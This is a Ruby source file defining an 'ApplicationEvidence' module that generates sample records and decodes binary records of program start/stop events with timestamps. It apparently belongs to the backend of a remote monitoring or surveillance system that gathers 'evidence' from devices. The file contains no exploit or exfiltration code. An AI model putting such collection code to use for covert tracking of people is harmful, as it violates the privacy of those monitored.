require 'rcs-common/evidence/common'

module RCS

module ApplicationEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    program = ["Safari", "Opera", "Firefox"].sample.to_utf16le_binary_null
    action = ['START', 'STOP'].sample.to_utf16le_binary_null
    info = ['qui quo qua', 'ciao miao bau'].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write action
    content.write info
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info = Hash[common_info]
      info[:data] = Hash.new if info[:data].nil?

      tm = stream.read 36
      info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      info[:data][:program] = ''
      info[:data][:action] = ''
      info[:data][:desc] = ''
      
      program = stream.read_utf16le_string
      info[:data][:program] = program.utf16le_to_utf8 unless program.nil?
      action = stream.read_utf16le_string
      info[:data][:action] = action.utf16le_to_utf8 unless action.nil?
      desc = stream.read_utf16le_string
      info[:data][:desc] = desc.utf16le_to_utf8 unless desc.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed APPLICATION (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end

end # ::RCS